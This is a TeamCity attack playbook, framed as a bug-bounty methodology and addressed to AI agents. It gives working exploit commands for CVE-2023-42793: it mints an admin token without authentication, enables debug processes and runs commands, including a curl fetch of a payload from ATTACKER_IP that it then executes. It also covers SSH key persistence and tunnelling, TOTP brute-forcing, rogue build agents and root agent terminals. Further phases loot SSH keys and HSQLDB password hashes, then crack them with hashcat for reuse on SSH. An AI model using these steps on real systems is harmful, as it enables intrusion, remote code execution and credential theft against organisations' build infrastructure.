---
technology: "JetBrains TeamCity"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
layer: TeamCity server/agent attack method
version: 1.0
source: "corpus-mined + upstream-verified (JetBrains/Sonar/Rapid7 advisories for CVE-2023-42793 and CVE-2024-27198/-27199, TeamCity documentation for data-directory and debug-processes layout)"
provenance: "chains distilled from the same gated corpus as the overview page; both authentication-bypass mechanics, fix versions, and the data-directory layout verified against vendor and researcher advisories before writing. Companion page: [[teamcity]]."
---

# JetBrains TeamCity — bug-bounty methodology

Companion overview: [[teamcity]]. Sibling CI surface with its own trust model: see [[jenkins]] for the controller/agent pattern in general.

## Phase 1 — Discovery

- Direct: `8111/tcp` answering HTTP with title `Log in to TeamCity` (redirect to `/login.html`); nmap reports Apache Tomcat beneath. The login footer prints the exact product build (`TeamCity Professional 2023.05.3 (build 129390)` style) — screenshot it; the build number picks the exploit.
- Subdomain: vhost brute-forcing on the parent domain with ffuf (`Host: FUZZ.example.com`, filter the default size) surfaces `teamcity`-prefixed subdomains that return 401 without DNS fanfare.
- Credential stores: password-manager and KeePass-derived databases hold `Teamcity` entries naming the subdomain and account (chain entry point — see [[keepass]]).
- On-host after a foothold: `ss -tulnp | grep 8111` — TeamCity bound to `127.0.0.1` is the standard "internal only" deployment. Confirm with a local nmap through the tunnel once built (Phase 2).

## Phase 2 — Reach a loopback deployment

```bash
# on the compromised host: create keys if none, allow yourself, then forward
ssh-keygen && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
# on your machine:
ssh -i id_rsa user@target.example.com -L 8111:127.0.0.1:8111 -N
nmap -Pn -sC -sV -p8111 127.0.0.1   # now the TeamCity login is local
```

The pattern generalizes: any local forward over the port the server listens on; `-N` keeps it as a pure tunnel.

## Phase 3 — Authentication bypasses (version-gated)

**CVE-2023-42793 — builds before 2023.05.4** (verified against the vendor/Rapid7 records; SonarSource's write-up covers the alternate paths):

1. Mint an admin token unauthenticated:

```bash
curl -X POST http://teamcity.example.com/app/rest/users/id:1/tokens/RPC2
# -> <?xml ...><token name="RPC2" value="eyJ..."/>
```

2. Enable the debug process runner by writing the data-dir config through the admin UI endpoints:

```bash
curl -H "Authorization: Bearer <TOKEN>" -X POST \
  'http://teamcity.example.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true'
curl -H "Authorization: Bearer <TOKEN>" \
  'http://teamcity.example.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties'   # apply/refresh
```

3. Execute commands via the debug REST endpoint (as the server user — `tcuser` in the Docker image):

```bash
curl -H "Authorization: Bearer <TOKEN>" -X POST \
  'http://teamcity.example.com/app/rest/debug/processes?exePath=whoami'
# fetch, stage, execute a payload in three calls:
'.../app/rest/debug/processes?exePath=curl&params=ATTACKER_IP/bash.sh&params=-o&params=/tmp/bash.sh'
'.../app/rest/debug/processes?exePath=chmod&params=777&params=/tmp/bash.sh'
'.../app/rest/debug/processes?exePath=/tmp/bash.sh'
```

**CVE-2024-27198 / CVE-2024-27199 — builds before 2024.03** (Rapid7, fixed 2024-03-04): authentication bypass via path traversal to the REST API using alternate path forms (`/../`-style sequences that the auth filter misses but the router accepts), and a second path-traversal for arbitrary file read. On 2024.03.1+ instances both are dead — do not burn the engagement on them; check the build number first.

**TOTP-gated logins**: two-factor is only a hurdle if you cannot read the source that validates it — brute-forcing the TOTP window from a leaked/derived seed is the documented path in hardened setups.

## Phase 4 — Authenticated build RCE (no CVE required)

TeamCity's product function is executing your build steps; most real access ends here.

- **Custom patch builds**: a Project Developer role carries the permission to change a build's source with a patch. Take the project's repo, edit a script the build executes (a `hello_world.ps1`-style step), produce `git diff > diff.txt`, upload it as the build's custom patch in the run dialog, and trigger. Your line runs on the agent — on Windows agents, mind Defender (simple `Invoke-WebRequest` callbacks prove it before staging shells).
- **Build-step creation** with broader roles: an "Execute shell/batch" step is the same primitive with more clicks.
- **Agent enrollment in AD estates**: agent OUs (`OU=BuildAgents,...`) often grant members rights to create computer objects — a machine account you enroll can become a rogue agent the server dispatches to. Enumerate the OU's ACLs (`Get-ACL "AD:..."`) before building this.

## Phase 5 — Agent abuse without any exploit

- **Agent terminals**: the agents view offers interactive terminals for debugging builds. On a server installed as root (common on Linux CI hosts because "the build needs everything"), an agent terminal is a root shell — log in with any valid TeamCity account that can view agents and open it.
- **Running-as-root check**: `ps aux | grep -i buildAgent` / the service definition; the server process user is who you become.

## Phase 6 — Credential and key loot

On the server (Docker deployments: `TEAMCITY_DATA_PATH=/data/teamcity_server/datadir` from `env`):

1. **Uploaded SSH keys** — `<datadir>/config/projects/<project>/pluginData/ssh_keys/` (documented layout). `id_rsa` files sit world-readable to the service user; the key's base64 tail decodes to a comment naming the owner (`cat id_rsa | grep -v -- '---' | base64 -d | xxd | tail -2` → `john@example`) when usernames are otherwise unknown.
2. **HSQLDB user table** — tar the `system/buildserver.*` files out (they must be copied together), then open locally:

```bash
tar -czvf buildserver.tar.gz buildserver*
java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing
# connect to the extracted DB, read PUBLIC.USERS: bcrypt hashes + usernames
```

Crack bcrypt with hashcat (`-m 3200`, rockyou); the reused password typically opens SSH on the host (the key's owner first, then the cracked user).
3. **Env/config**: `env` prints `TEAMCITY_DATA_PATH`; project configs under `config/projects/*/` carry VCS roots, parameters, and sometimes tokens.

## Phase 7 — Reporting order

An unauthenticated bypass on a pre-2023.05.4 build is the headline finding (fix gates: 2023.05.4; 2024.03 for the traversal pair). Authenticated patch-RCE should be reported against the role model ("Project Developer can execute on agents by design — accepted risk?" — many programs treat it as informative). Loopback-only exposure plus weak egress on the CI host is a hardening finding; pair it with whatever the agent runs as.

## Tool quick reference

- Tunnels: ssh local forward (`-L 8111:127.0.0.1:8111 -N`).
- REST: curl with `Authorization: Bearer <token>` against `/app/rest/...`.
- HSQLDB: the hsqldb jar's `DatabaseManagerSwing` (or `SqlTool`) against the copied-out `buildserver` files.
- Cracking: hashcat `-m 3200`; SSH key handling with ssh-keygen/xxd for comment extraction.
